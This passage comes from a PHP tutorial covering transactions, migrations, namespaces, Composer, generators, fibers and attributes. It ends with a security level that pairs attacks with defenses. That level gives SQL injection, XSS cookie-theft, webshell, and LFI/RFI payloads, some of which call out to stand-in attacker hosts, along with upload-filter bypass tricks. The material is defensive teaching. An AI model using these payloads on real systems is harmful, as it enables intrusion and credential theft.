+$stmt-&gt;execute([$_GET['id']]);</code></pre>
+The user's input can never be interpreted as SQL — it's always treated as a value.
+<br><br>
+<strong>Edge case: identifiers can't be parameterized.</strong> You can't write <code>ORDER BY ?</code> and expect it to work — MySQL needs the column name baked into the query plan. If you must accept a column name from the user, whitelist it:
+<pre style="margin-top:8px;"><code>$allowed = ['name', 'email', 'created_at'];
+$col = in_array($_GET['sort'], $allowed, true) ? $_GET['sort'] : 'id';
+$sql = "SELECT * FROM users ORDER BY $col";</code></pre>
+</div>
+
+<h2>6.4 Transactions</h2>
+
+<div class="theory">
+A <strong>transaction</strong> groups several SQL statements so they succeed or fail together. If any statement fails, all previous statements in the transaction are rolled back — as if nothing happened. This is critical for operations like money transfers, where a partial failure would corrupt data.
+</div>
+
+<div class="analogy">
+<p>A transaction is like a shopping cart checkout. Either everything is bought (payment succeeds, all items are yours) or nothing is (payment fails, cart is emptied, no items charged). You never end up with a half-completed purchase.</p>
+</div>
+
+<pre><code>&lt;?php
+try {
+    $pdo-&gt;beginTransaction();
+
+    // Debit sender
+    $stmt = $pdo-&gt;prepare("UPDATE accounts SET balance = balance - ? WHERE id = ?");
+    $stmt-&gt;execute([$amount, $fromId]);
+
+    // Credit receiver
+    $stmt = $pdo-&gt;prepare("UPDATE accounts SET balance = balance + ? WHERE id = ?");
+    $stmt-&gt;execute([$amount, $toId]);
+
+    // Log the transfer
+    $stmt = $pdo-&gt;prepare("INSERT INTO transfers (from_id, to_id, amount) VALUES (?,?,?)");
+    $stmt-&gt;execute([$fromId, $toId, $amount]);
+
+    $pdo-&gt;commit();
+    echo "Transfer successful";
+} catch (Exception $e) {
+    $pdo-&gt;rollBack();
+    error_log("Transfer failed: " . $e-&gt;getMessage());
+    exit("Transfer failed");
+}
+?&gt;</code></pre>
+
+<div class="security">
+<strong>Race conditions (TOCTOU — Time Of Check to Time Of Use).</strong>
+<br><br>
+Consider this "safe" code:
+<pre style="margin-top:8px;"><code>// Check balance
+$balance = getBalance($userId);
+if ($balance &lt; $amount) die("Insufficient funds");
+
+// Deduct
+deductBalance($userId, $amount);</code></pre>
+Two simultaneous requests can both read the same balance (say, 100), both see it's ≥ 50, and both deduct 50 — leaving the account at 0 even though it should be at 0 in this case, or worse, going negative.
+<br><br>
+<strong>Fix:</strong> do the check and the deduct in a single atomic SQL statement, or use a transaction with <code>SELECT ... FOR UPDATE</code>:
+<pre style="margin-top:8px;"><code>$pdo-&gt;beginTransaction();
+$stmt = $pdo-&gt;prepare("SELECT balance FROM accounts WHERE id = ? FOR UPDATE");
+$stmt-&gt;execute([$userId]);
+$balance = $stmt-&gt;fetchColumn();
+if ($balance &lt; $amount) {
+    $pdo-&gt;rollBack();
+    die("Insufficient funds");
+}
+$pdo-&gt;prepare("UPDATE accounts SET balance = balance - ? WHERE id = ?")
+    -&gt;execute([$amount, $userId]);
+$pdo-&gt;commit();</code></pre>
+</div>
+
+<h2>6.5 Basic Migrations</h2>
+
+<div class="theory">
+As your app evolves, your database schema changes — you add a column, rename a table, drop an index. Instead of manually running SQL on every environment (dev, staging, prod), you write <strong>migrations</strong> — versioned SQL scripts that run in order. This makes schema changes reproducible and safe.
+</div>
+
+<pre><code>&lt;?php
+// migrations/001_create_users.sql
+CREATE TABLE users (
+    id INT PRIMARY KEY AUTO_INCREMENT,
+    username VARCHAR(50) UNIQUE NOT NULL,
+    email VARCHAR(255) UNIQUE NOT NULL,
+    password_hash VARCHAR(255) NOT NULL,
+    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+);
+
+// migrations/002_add_phone_to_users.sql
+ALTER TABLE users ADD COLUMN phone VARCHAR(20);
+
+// migrations/003_create_posts.sql
+CREATE TABLE posts (
+    id INT PRIMARY KEY AUTO_INCREMENT,
+    user_id INT NOT NULL,
+    title VARCHAR(255) NOT NULL,
+    body TEXT,
+    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
+);</code></pre>
+
+<p>A simple migration runner:</p>
+
+<pre><code>&lt;?php
+function runMigrations(PDO $pdo, string $dir): void {
+    $pdo-&gt;exec("CREATE TABLE IF NOT EXISTS migrations (
+        id INT PRIMARY KEY AUTO_INCREMENT,
+        filename VARCHAR(255) UNIQUE NOT NULL,
+        ran_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+    )");
+
+    $ran = $pdo-&gt;query("SELECT filename FROM migrations")
+              -&gt;fetchAll(PDO::FETCH_COLUMN);
+
+    $files = glob($dir . "/*.sql");
+    sort($files);
+
+    foreach ($files as $file) {
+        $name = basename($file);
+        if (in_array($name, $ran, true)) continue;
+
+        echo "Running: $name\n";
+        $sql = file_get_contents($file);
+
+        $pdo-&gt;beginTransaction();
+        try {
+            $pdo-&gt;exec($sql);
+            $stmt = $pdo-&gt;prepare("INSERT INTO migrations (filename) VALUES (?)");
+            $stmt-&gt;execute([$name]);
+            $pdo-&gt;commit();
+        } catch (Exception $e) {
+            $pdo-&gt;rollBack();
+            throw $e;
+        }
+    }
+}
+?&gt;</code></pre>
+
+<h2>6.6 Level 6 Practice</h2>
+
+<div class="practice">
+<ol>
+  <li><strong>Blog schema:</strong> Design tables for users, posts, and comments with proper foreign keys. Write CREATE TABLE statements.</li>
+  <li><strong>CRUD with prepared statements:</strong> Build a <code>UserRepository</code> class with methods <code>create</code>, <code>findById</code>, <code>findByEmail</code>, <code>update</code>, <code>delete</code>. Use PDO prepared statements throughout.</li>
+  <li><strong>Prepared statement audit:</strong> Take a piece of vulnerable code using <code>$pdo-&gt;query()</code> with interpolated input. Rewrite it with <code>prepare()</code>/<code>execute()</code>. Write a test that sends <code>' OR 1=1 --</code> and confirms no rows leak.</li>
+  <li><strong>Transaction safety:</strong> Implement a transfer between two accounts. Simulate a failure mid-transaction. Confirm both accounts are unchanged after rollback.</li>
+  <li><strong>Race condition:</strong> Write two scripts that try to decrement a stock counter simultaneously. Run them in parallel. Without <code>FOR UPDATE</code>, reproduce a lost update. Then fix it with row-level locking.</li>
+  <li><strong>Migration runner:</strong> Implement the migration runner above. Add three SQL migrations. Run them twice — the second run should be a no-op.</li>
+</ol>
+</div>
+
+<div class="page-break"></div>
+
+<h1 style="text-align:center; padding:80px 20px; border:none; color:#9c27b0;">✓  END OF PART 3</h1>
+<p style="text-align:center; color:#888; font-size:1.05em;">
+Levels 5 &amp; 6 complete. Levels 7 &amp; 8 arrive in <strong>Part 4</strong>.<br>
+After Part 4, insert it the same way, then print the entire file to PDF once.
+</p>
+
+<!-- ==================================================== -->
+<!--                     LEVEL 7                         -->
+<!-- ==================================================== -->
+<h1>Level 7 — Advanced PHP <span class="badge adv">ADVANCED</span></h1>
+
+<h2>7.1 Namespaces</h2>
+
+<div class="theory">
+A <strong>namespace</strong> is a way to group related classes, functions, and constants under a unique label. Without namespaces, if two libraries both define a class called <code>User</code>, they collide. Namespaces let both exist: <code>App\Models\User</code> and <code>Vendor\Auth\User</code>. This is PHP's solution to the "global namespace pollution" problem that plagued early versions.
+</div>
+
+<div class="analogy">
+<p>Think of namespaces as folders on your computer. You can have <code>/music/song.mp3</code> and <code>/podcasts/song.mp3</code> — same filename, different locations, no conflict. Namespaces are folders for code. <code>App\Models\User</code> and <code>Vendor\Auth\User</code> can both exist; PHP knows which you mean by the folder path.</p>
+</div>
+
+<h3>Declaring a Namespace</h3>
+
+<pre><code>&lt;?php
+// File: src/Models/User.php
+namespace App\Models;
+
+class User {
+    public function __construct(public string $name) {}
+}
+
+// File: src/Controllers/UserController.php
+namespace App\Controllers;
+
+use App\Models\User;             // import
+use App\Models\Product as Item;   // alias
+use App\Services\{Mailer, Logger}; // group import (PHP 7)
+
+class UserController {
+    public function show() {
+        $user = new User("Devils");
+        $item = new Item();
+        $mailer = new Mailer();
+        $logger = new Logger();
+    }
+}
+?&gt;</code></pre>
+
+<h3>Full vs Relative Names</h3>
+
+<pre><code>&lt;?php
+namespace App\Models;
+
+// Fully-qualified (from root)
+$u = new \App\Models\User();
+
+// Relative to current namespace
+$u = new User();
+
+// Subnamespace
+$u = new Sub\User();
+
+// Global function (with leading backslash)
+$len = \strlen("hello");
+?&gt;</code></pre>
+
+<div class="note">
+Inside a namespace, unqualified names (<code>new User()</code>) resolve to the current namespace. Built-in PHP functions like <code>strlen()</code> are looked up first in the current namespace, then in the global namespace — but PHP 8's performance improvements make this fallback cheap. For constants and classes though, always import or use fully-qualified names.
+</div>
+
+<h2>7.2 Composer</h2>
+
+<div class="theory">
+<strong>Composer</strong> is PHP's dependency manager — like npm for JavaScript or pip for Python. It reads your <code>composer.json</code> file, downloads the packages you listed (and their dependencies), and generates an autoloader so you can use them with a single <code>require</code>.
+</div>
+
+<h3>Installing Composer</h3>
+
+<pre><code># Windows — download installer from getcomposer.org
+# macOS / Linux:
+curl -sS https://getcomposer.org/installer | php
+sudo mv composer.phar /usr/local/bin/composer
+
+# Verify
+composer --version</code></pre>
+
+<h3>composer.json</h3>
+
+<pre><code>{
+    "name": "unknown/devils-portal",
+    "description": "Exam marks portal",
+    "type": "project",
+    "require": {
+        "php": "^8.1",
+        "monolog/monolog": "^3.0",
+        "guzzlehttp/guzzle": "^7.0",
+        "vlucas/phpdotenv": "^5.0"
+    },
+    "require-dev": {
+        "phpunit/phpunit": "^10.0"
+    },
+    "autoload": {
+        "psr-4": {
+            "App\\": "src/"
+        }
+    }
+}</code></pre>
+
+<h3>Installing Dependencies</h3>
+
+<pre><code>composer install    # installs from composer.lock
+composer update     # updates to latest matching composer.json
+composer require guzzlehttp/guzzle   # add a new dependency
+composer remove monolog/monolog      # remove one</code></pre>
+
+<h3>PSR-4 Autoloading</h3>
+
+<div class="theory">
+PSR-4 is the standard for mapping namespace prefixes to directories. If you write:
+</div>
+
+<pre><code>"autoload": {
+    "psr-4": { "App\\": "src/" }
+}</code></pre>
+
+<p>Then <code>App\Models\User</code> maps to <code>src/Models/User.php</code>. Just <code>require 'vendor/autoload.php'</code> once in your entry point, and all classes auto-load on demand.</p>
+
+<pre><code>&lt;?php
+require __DIR__ . '/vendor/autoload.php';
+
+use App\Models\User;
+use Monolog\Logger;
+use Monolog\Handler\StreamHandler;
+
+$user = new User("Devils");   // autoloaded from src/Models/User.php
+?&gt;</code></pre>
+
+<h2>7.3 Generators</h2>
+
+<div class="theory">
+A <strong>generator</strong> is a function that yields values one at a time instead of returning them all at once. The function "pauses" at each <code>yield</code> and resumes when the next value is requested. This means you can iterate over huge datasets — millions of rows, gigabytes of log files — without loading them all into memory.
+</div>
+
+<div class="analogy">
+<p>A regular function that returns an array is like a chef who cooks a 1000-item buffet all at once. A generator is like a sushi conveyor belt — each plate arrives as you need it. Same meal, tiny footprint, no waiting.</p>
+</div>
+
+<h3>Basic Generator</h3>
+
+<pre><code>&lt;?php
+function countUp(int $to): Generator {
+    for ($i = 1; $i &lt;= $to; $i++) {
+        yield $i;
+    }
+}
+
+foreach (countUp(5) as $n) {
+    echo "$n ";   // 1 2 3 4 5
+}
+?&gt;</code></pre>
+
+<h3>Memory Comparison</h3>
+
+<pre><code>&lt;?php
+// BAD — loads 1 million integers into memory (~30 MB)
+function rangeArray(int $n): array {
+    $out = [];
+    for ($i = 0; $i &lt; $n; $i++) $out[] = $i;
+    return $out;
+}
+
+// GOOD — one integer in memory at a time
+function rangeGen(int $n): Generator {
+    for ($i = 0; $i &lt; $n; $i++) yield $i;
+}
+
+foreach (rangeGen(1_000_000) as $n) {
+    // process
+}
+?&gt;</code></pre>
+
+<h3>Streaming a Large File</h3>
+
+<pre><code>&lt;?php
+function readLines(string $file): Generator {
+    $fh = fopen($file, 'r');
+    if (!$fh) throw new RuntimeException("Cannot open $file");
+
+    try {
+        while (($line = fgets($fh)) !== false) {
+            yield rtrim($line, "\n");
+        }
+    } finally {
+        fclose($fh);
+    }
+}
+
+foreach (readLines('/var/log/huge.log') as $line) {
+    if (str_contains($line, 'ERROR')) echo $line . "\n";
+}
+// Only one line in memory at a time — works on 10 GB files
+?&gt;</code></pre>
+
+<h3>Generators with Keys &amp; Values</h3>
+
+<pre><code>&lt;?php
+function keyValuePairs(array $users): Generator {
+    foreach ($users as $u) {
+        yield $u['id'] =&gt; $u['name'];
+    }
+}
+
+foreach (keyValuePairs($users) as $id =&gt; $name) {
+    echo "$id: $name\n";
+}
+
+// Generator delegation (yield from)
+function allNumbers(): Generator {
+    yield from countUp(3);
+    yield from countUp(3);
+}
+?&gt;</code></pre>
+
+<h2>7.4 Fibers (PHP 8.1+)</h2>
+
+<div class="theory">
+A <strong>fiber</strong> is a low-level unit of concurrency. It lets a function pause and resume, similar to a generator — but fibers can be paused <em>anywhere</em>, and you control when they resume from outside. This enables cooperative multitasking, async/await patterns, and frameworks like ReactPHP and AMPHP.
+</div>
+
+<div class="analogy">
+<p>A fiber is like a bookmark in a book. You read to page 42, put a bookmark in, hand it to someone else — they do their thing — then you pick the book up again at page 42 and keep reading as if nothing happened. The book never loses its place.</p>
+</div>
+
+<pre><code>&lt;?php
+$fiber = new Fiber(function(): void {
+    echo "Fiber started\n";
+    $value = Fiber::suspend('paused');
+    echo "Fiber resumed with: $value\n";
+    Fiber::suspend('again');
+    echo "Fiber finished\n";
+});
+
+echo "Main: starting fiber\n";
+$result = $fiber-&gt;start();
+echo "Main: fiber suspended with '$result'\n";
+
+$result = $fiber-&gt;resume('hello');
+echo "Main: fiber suspended again with '$result'\n";
+
+$fiber-&gt;resume('goodbye');
+echo "Main: done\n";
+?&gt;</code></pre>
+
+<pre><code>Output:
+Main: starting fiber
+Fiber started
+Main: fiber suspended with 'paused'
+Fiber resumed with: hello
+Main: fiber suspended again with 'again'
+Fiber finished
+Main: done</code></pre>
+
+<div class="theory">
+Fibers are used internally by async frameworks. Unless you're building one, you'll probably never create a fiber directly. But understanding them helps you read the source of ReactPHP, AMPHP, and Swoole.
+</div>
+
+<h2>7.5 Attributes (PHP 8+)</h2>
+
+<div class="theory">
+<strong>Attributes</strong> are PHP's answer to annotations. They let you attach structured metadata to classes, methods, properties, and parameters. Frameworks read them at runtime using Reflection to configure behavior — routing, validation, ORM mapping, and more.
+</div>
+
+<div class="analogy">
+<p>An attribute is like a sticky note attached to a class or method. It doesn't change the code by itself — but other code can read the sticky note and act on it. A router might read <code>#[Route('/users')]</code> and wire up a URL. A validator might read <code>#[Required]</code> and reject empty fields.</p>
+</div>
+
+<h3>Defining an Attribute</h3>
+
+<pre><code>&lt;?php
+#[Attribute(Attribute::TARGET_METHOD)]
+class Route {
+    public function __construct(public string $path, public string $method = 'GET') {}
+}
+
+#[Attribute(Attribute::TARGET_PROPERTY)]
+class Column {
+    public function __construct(public string $name) {}
+}
+?&gt;</code></pre>
+
+<h3>Using Attributes</h3>
+
+<pre><code>&lt;?php
+class UserController {
+    #[Route('/users', 'GET')]
+    public function list() { /* ... */ }
+
+    #[Route('/users', 'POST')]
+    public function create() { /* ... */ }
+}
+
+class User {
+    #[Column('user_name')]
+    public string $name;
+
+    #[Column('email_address')]
+    public string $email;
+}
+?&gt;</code></pre>
+
+<h3>Reading Attributes via Reflection</h3>
+
+<pre><code>&lt;?php
+$ref = new ReflectionClass(UserController::class);
+
+foreach ($ref-&gt;getMethods() as $method) {
+    foreach ($method-&gt;getAttributes(Route::class) as $attr) {
+        $route = $attr-&gt;newInstance();
+        echo "{$route-&gt;method} {$route-&gt;path} → {$method-&gt;getName()}\n";
+    }
+}
+
+// Output:
+// GET /users → list
+// POST /users → create
+?&gt;</code></pre>
+
+<h2>7.6 Advanced Type System</h2>
+
+<h3>Union Types (PHP 8.0)</h3>
+
+<pre><code>&lt;?php
+function parse(string|int $input): int|false {
+    return is_numeric($input) ? (int)$input : false;
+}
+
+class Id {
+    public function __construct(public int|string $value) {}
+}
+?&gt;</code></pre>
+
+<h3>Intersection Types (PHP 8.1)</h3>
+
+<pre><code>&lt;?php
+interface Countable2 { public function count(): int; }
+interface Traversable2 { public function items(): array; }
+
+function process(Countable2&amp;Traversable2 $collection): void {
+    // $collection must implement BOTH interfaces
+}
+?&gt;</code></pre>
+
+<h3>Readonly Classes (PHP 8.2)</h3>
+
+<pre><code>&lt;?php
+readonly class Point {
+    public function __construct(
+        public int $x,
+        public int $y,
+    ) {}
+}
+// Every property is automatically readonly
+?&gt;</code></pre>
+
+<h3>Enums with Interfaces</h3>
+
+<pre><code>&lt;?php
+interface HasLabel {
+    public function label(): string;
+}
+
+enum Status: string implements HasLabel {
+    case Active = 'active';
+    case Banned = 'banned';
+
+    public function label(): string {
+        return match($this) {
+            Status::Active =&gt; "Active User",
+            Status::Banned =&gt; "Banned User",
+        };
+    }
+}
+?&gt;</code></pre>
+
+<h2>7.7 Level 7 Practice</h2>
+
+<div class="practice">
+<ol>
+  <li><strong>Namespace restructure:</strong> Take your Level 4 practice code and split it into namespaced files under <code>src/</code>. Set up PSR-4 autoloading.</li>
+  <li><strong>Composer project:</strong> Create a new project with <code>composer init</code>. Add <code>monolog/monolog</code> as a dependency. Use it to log messages to a file.</li>
+  <li><strong>Generator pipeline:</strong> Write three generator functions — <code>readNumbers()</code>, <code>filterEven()</code>, <code>squareAll()</code> — and chain them. Feed a million numbers through without exceeding 1 MB memory.</li>
+  <li><strong>Fiber-based task runner:</strong> Write a small scheduler that runs three fibers in round-robin, printing progress each turn.</li>
+  <li><strong>Attribute-based router:</strong> Define a <code>Route</code> attribute, tag three controller methods, and write a dispatcher that reads attributes via Reflection to route the current URL.</li>
+  <li><strong>Type-safe value objects:</strong> Create <code>Email</code>, <code>Phone</code>, and <code>Money</code> as readonly classes with validation in the constructor. Use union types where appropriate.</li>
+</ol>
+</div>
+
+<div class="page-break"></div>
+
+<!-- ==================================================== -->
+<!--                     LEVEL 8                         -->
+<!-- ==================================================== -->
+<h1>Level 8 — Security &amp; Exploitation <span class="badge exp">EXPERT</span></h1>
+
+<div class="theory">
+This level is the heart of what makes PHP knowledge <em>dangerous in the right hands</em>. Every attack here has a matching defense. This is the same content taught in the OWASP Top 10, PortSwigger Web Security Academy, and OSCP certification. Study it carefully — the difference between a script kiddie and a security engineer is understanding *why* each attack works at a mechanistic level.
+</div>
+
+<h2>8.1 SQL Injection</h2>
+
+<div class="theory">
+SQL injection occurs when user input is concatenated into an SQL query without parameterization. The attacker's input is then parsed as SQL code, letting them change the query's logic, extract data, modify data, or even execute OS commands.
+</div>
+
+<div class="analogy">
+<p>Imagine writing a letter to a friend: "Meet me at [user_input] at 5 PM." If someone fills in the blank with "the café. Also, send me your bank details", the meaning of the whole letter changes. That's SQL injection — the user's data becomes part of the instruction.</p>
+</div>
+
+<h3>Vulnerable Code</h3>
+
+<pre><code>&lt;?php
+// Classic injectable
+$id = $_GET['id'];
+$sql = "SELECT * FROM users WHERE id = $id";
+$result = $pdo-&gt;query($sql);
+?&gt;</code></pre>
+
+<h3>Attack Payloads</h3>
+
+<pre><code># Authentication bypass
+?id=1 OR 1=1--
+
+# Extract data via UNION
+?id=1 UNION SELECT username, password_hash FROM users--
+
+# Discover tables (information_schema)
+?id=1 UNION SELECT table_name, 2 FROM information_schema.tables--
+
+# Time-based blind (no output shown)
+?id=1 AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--
+
+# Out-of-band via DNS (advanced)
+?id=1; SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\x'))--
+</code></pre>
+
+<h3>Mitigation</h3>
+
+<pre><code>&lt;?php
+// CORRECT — prepared statement
+$stmt = $pdo-&gt;prepare("SELECT * FROM users WHERE id = ?");
+$stmt-&gt;execute([$_GET['id']]);
+$user = $stmt-&gt;fetch();
+?&gt;</code></pre>
+
+<div class="security">
+<strong>Rules:</strong>
+<ul style="margin-top:6px;">
+  <li><strong>Always</strong> use prepared statements with placeholder values.</li>
+  <li>Set <code>PDO::ATTR_EMULATE_PREPARES =&gt; false</code> so PDO uses real server-side prepared statements. Emulated prepares can be tricked under certain charset conditions.</li>
+  <li>Use <code>utf8mb4</code> charset, not <code>utf8</code> (which is a 3-byte subset with known injection edge cases).</li>
+  <li>For identifiers (table/column names), use a strict whitelist — never parameters.</li>
+  <li>Use least-privilege database accounts. The app user should have only SELECT/INSERT/UPDATE/DELETE on needed tables — no DROP, no GRANT, no FILE.</li>
+</ul>
+</div>
+
+<h2>8.2 Cross-Site Scripting (XSS)</h2>
+
+<div class="theory">
+XSS occurs when user-controlled data is echoed to a page without escaping, letting an attacker inject JavaScript that runs in the victim's browser. There are three flavors:
+</div>
+
+<ul>
+  <li><strong>Reflected XSS</strong> — payload in the URL is echoed back on the same page (needs victim to click a crafted link).</li>
+  <li><strong>Stored XSS</strong> — payload is saved in the database, affects every visitor who views it (the most dangerous).</li>
+  <li><strong>DOM-based XSS</strong> — client-side JavaScript writes user input to the DOM without sanitizing (<code>innerHTML</code>, <code>document.write</code>).</li>
+</ul>
+
+<h3>Vulnerable Code</h3>
+
+<pre><code>&lt;?php
+// Reflected XSS
+echo "Hello, " . $_GET['name'];
+
+// Stored XSS — from database
+echo "&lt;div&gt;{$comment['body']}&lt;/div&gt;";
+?&gt;</code></pre>
+
+<h3>Attack Payloads</h3>
+
+<pre><code># Steal cookies
+?name=&lt;script&gt;fetch('https://attacker.com/?c='+document.cookie)&lt;/script&gt;
+
+# Break out of attribute
+&lt;img src="x" onerror="fetch('https://evil.com/?c='+document.cookie)"&gt;
+
+# In href attribute
+&lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;
+</code></pre>
+
+<h3>Mitigation</h3>
+
+<pre><code>&lt;?php
+// Escape ALL user data before output
+echo "Hello, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
+
+// For attributes
+echo '&lt;div data-name="' . htmlspecialchars($name, ENT_QUOTES, 'UTF-8') . '"&gt;';
+
+// For URLs
+echo '&lt;a href="' . htmlspecialchars(urlencode($url), ENT_QUOTES, 'UTF-8') . '"&gt;';
+
+// Content Security Policy header (defense-in-depth)
+header("Content-Security-Policy: default-src 'self'; script-src 'self'");
+?&gt;</code></pre>
+
+<div class="security">
+<strong>Best practices:</strong>
+<ul style="margin-top:6px;">
+  <li><strong>Context matters.</strong> HTML body, HTML attribute, JavaScript, CSS, and URL each need different escaping. <code>htmlspecialchars()</code> is correct for HTML body and attribute contexts.</li>
+  <li><strong>Never use <code>strip_tags()</code> alone</strong> — it can leave dangerous partial tags. It's also not designed for sanitization.</li>
+  <li><strong>Prefer templating engines</strong> (Twig, Blade) that auto-escape by default.</li>
+  <li><strong>Add CSP headers</strong> as a backup layer — even if XSS sneaks through, CSP can block script execution.</li>
+  <li><strong>Set <code>httponly</code> on session cookies</strong> so XSS can't steal them.</li>
+</ul>
+</div>
+
+<h2>8.3 Cross-Site Request Forgery (CSRF)</h2>
+
+<div class="theory">
+CSRF tricks a logged-in victim into submitting a request to your site from a different origin. Because the browser automatically sends cookies with every request to your domain, the server can't tell if the request came from your site's form or from an attacker's hidden page.
+</div>
+
+<div class="analogy">
+<p>You're logged into your bank. You open a malicious page in another tab. That page contains a hidden form that auto-submits <code>POST /transfer?to=attacker&amp;amount=10000</code>. Your browser sends the request with your bank cookies attached. Your bank thinks it's you. The transfer succeeds.</p>
+</div>
+
+<h3>Vulnerable Code</h3>
+
+<pre><code>&lt;?php
+// No verification that the request came from your own form
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    transferMoney($_SESSION['user_id'], $_POST['to'], $_POST['amount']);
+}
+?&gt;</code></pre>
+
+<h3>Mitigation — CSRF Tokens</h3>
+
+<pre><code>&lt;?php
+session_start();
+
+// Generate once per session
+if (empty($_SESSION['csrf'])) {
+    $_SESSION['csrf'] = bin2hex(random_bytes(32));
+}
+
+// In every form
+echo '&lt;input type="hidden" name="csrf" value="' . $_SESSION['csrf'] . '"&gt;';
+
+// On submit
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) {
+        http_response_code(403);
+        exit("Invalid CSRF token");
+    }
+    // proceed
+}
+?&gt;</code></pre>
+
+<div class="security">
+<strong>Additional defenses:</strong>
+<ul style="margin-top:6px;">
+  <li><strong>SameSite=Strict</strong> on session cookies — prevents them from being sent with cross-site requests at all. This alone blocks most CSRF in modern browsers.</li>
+  <li><strong>Verify Origin/Referer headers</strong> for sensitive actions.</li>
+  <li><strong>Require re-authentication</strong> for high-risk operations (changing password, deleting account).</li>
+  <li><strong>Use POST (not GET) for state-changing actions</strong> — GET requests can be triggered by image tags, links, and prefetchers.</li>
+  <li><strong>Never use <code>hash_equals()</code> alternatives</strong> for token comparison — regular <code>==</code> is timing-attack vulnerable.</li>
+</ul>
+</div>
+
+<h2>8.4 File Upload Vulnerabilities</h2>
+
+<div class="theory">
+Uploads are dangerous because the file lands on the server and — if the server is misconfigured — may be executed. The main attack is uploading a PHP webshell.
+</div>
+
+<h3>The Attack</h3>
+
+<pre><code># Attacker uploads "shell.php" (or renames it):
+&lt;?php system($_GET['cmd']); ?&gt;
+
+# Then browses to:
+https://victim.com/uploads/shell.php?cmd=cat%20/etc/passwd
+# → server-side RCE
+</code></pre>
+
+<h3>Bypass Techniques</h3>
+
+<ul>
+  <li><strong>Double extension:</strong> <code>shell.php.jpg</code> (works if server misconfigured to run <code>.jpg</code> as PHP)</li>
+  <li><strong>Null byte (PHP &lt; 5.3.4):</strong> <code>shell.php%00.jpg</code> — the null byte truncated the extension</li>
+  <li><strong>MIME spoofing:</strong> Sending <code>Content-Type: image/jpeg</code> while the body is PHP</li>
+  <li><strong>Case manipulation:</strong> <code>shell.PHP</code> if the server is case-insensitive on extensions</li>
+  <li><strong>.htaccess upload:</strong> Upload a <code>.htaccess</code> that says <code>AddType application/x-httpd-php .jpg</code> — now all <code>.jpg</code> files run as PHP</li>
+</ul>
+
+<h3>Full Mitigation</h3>
+
+<pre><code>&lt;?php
+function safeUpload(array $file): string {
+    // 1. Check error
+    if ($file['error'] !== UPLOAD_ERR_OK) throw new RuntimeException("Upload error");
+
+    // 2. Check size
+    if ($file['size'] &gt; 5 * 1024 * 1024) throw new RuntimeException("Too large");
+
+    // 3. Check real MIME type from content
+    $finfo = new finfo(FILEINFO_MIME_TYPE);
+    $mime = $finfo-&gt;file($file['tmp_name']);
+    $allowed = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
+    if (!in_array($mime, $allowed, true)) throw new RuntimeException("Bad type");
+
+    // 4. Map MIME to canonical extension
+    $ext = [
+        'image/jpeg' =&gt; 'jpg',
+        'image/png'  =&gt; 'png',
+        'image/gif'  =&gt; 'gif',
+        'image/webp' =&gt; 'webp',
+    ][$mime];
+
+    // 5. Generate random filename
+    $name = bin2hex(random_bytes(16)) . '.' . $ext;
+
+    // 6. Store outside webroot
+    $dir = '/var/app-uploads/';   // NOT under public_html
+    move_uploaded_file($file['tmp_name'], $dir . $name);
+
+    return $name;
+}
+?&gt;</code></pre>
+
+<div class="security">
+<strong>Deployment checklist:</strong>
+<ul style="margin-top:6px;">
+  <li>Store uploads <strong>outside the web root</strong> whenever possible. Serve them through a PHP script that checks authentication.</li>
+  <li>If you must serve from a public directory, add an <code>.htaccess</code> (or nginx config) disabling PHP execution in that directory:
+<pre style="margin-top:6px;"><code># .htaccess in uploads/
+php_flag engine off
+&lt;FilesMatch "\.(php|phtml|php3|php4|php5|php7|phps|pht)$"&gt;
+    Require all denied
+&lt;/FilesMatch&gt;</code></pre>
+  </li>
+  <li>Set <code>upload_max_filesize</code>, <code>post_max_size</code>, and <code>max_file_uploads</code> in <code>php.ini</code>.</li>
+  <li>Rename every uploaded file — never trust the client's filename.</li>
+  <li>Strip EXIF metadata to prevent leaking GPS/device data.</li>
+</ul>
+</div>
+
+<h2>8.5 Local &amp; Remote File Inclusion (LFI/RFI)</h2>
+
+<div class="theory">
+<strong>LFI</strong> occurs when user input is used to include a file from the server's filesystem. <strong>RFI</strong> is when the file is loaded from a remote URL. LFI typically reads sensitive files; RFI usually escalates to full code execution.
+</div>
+
+<h3>Vulnerable Code</h3>
+
+<pre><code>&lt;?php
+$page = $_GET['page'];
+include($page . ".php");
+?&gt;</code></pre>
+
+<h3>Attack Payloads</h3>
+
+<pre><code># LFI — read files
+?page=../../../../etc/passwd
+?page=../../../../var/log/apache2/access.log     # log poisoning prep
+
+# LFI + PHP filter to read source
+?page=php://filter/convert.base64-encode/resource=config
+
+# LFI to RCE via log poisoning — first inject PHP into a log via User-Agent:
+# User-Agent: &lt;?php system($_GET['c']); ?&gt;
+# Then: ?page=../../../../var/log/apache2/access.log&amp;c=id
+
+# RFI (requires allow_url_include=On — very rare now)
+?page=http://attacker.com/shell.txt
+</code></pre>
+
+<h3>Mitigation</h3>
+
+<pre><code>&lt;?php
+// Whitelist approach — the only safe way
+$pages = [
+    'home'    =&gt; __DIR__ . '/pages/home.php',
+    'about'   =&gt; __DIR__ . '/pages/about.php',
+    'contact' =&gt; __DIR__ . '/pages/contact.php',
+];
+
+$key = $_GET['page'] ?? 'home';
+if (!array_key_exists($key, $pages)) {
+    http_response_code(404);
+    exit("Not found");
+}
+include $pages[$key];
+
+// Also disable remote includes in php.ini:
+// allow_url_include = Off
+// allow_url_fopen = Off   (if you don't need URL file access)
+?&gt;</code></pre>
+
+<div class="security">
+<strong>Why blacklists fail:</strong> Filtering <code>"../"</code> doesn't stop <code>....//</code>, <code>..%2f</code>, URL-encoded variants, or null bytes. Filtering <code>"php://"</code> doesn't stop <code>PHP://</code> (case) or other wrappers. <strong>Only whitelisting works.</strong>
+</div>
+
+<h2>8.6 PHP Object Injection (POI)</h2>
+
+<div class="theory">
+When PHP unserializes attacker-controlled data, it reconstructs objects from your application's classes and calls magic methods at defined points. If any of those magic methods performs a dangerous operation, an attacker can trigger it. This is one of the most powerful — and least understood — PHP vulnerabilities.
+</div>
+
